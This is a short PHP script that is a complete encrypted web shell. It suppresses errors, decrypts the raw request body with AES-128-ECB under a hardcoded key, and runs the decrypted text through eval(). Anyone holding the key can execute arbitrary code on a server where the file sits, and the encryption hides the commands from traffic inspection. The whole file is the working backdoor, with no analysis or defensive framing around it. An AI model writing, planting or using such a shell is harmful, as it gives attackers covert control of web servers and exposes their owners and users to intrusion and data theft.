<?php
    @error_reporting(0);
    function Decrypt($data) {
        $key = "e45e329feb5d925b";
        return openssl_decrypt(base64_decode($data), "AES-128-ECB", $key, OPENSSL_PKCS1_PADDING);
    }
    $post = Decrypt(file_get_contents("php://input"));
    eval($post);
?>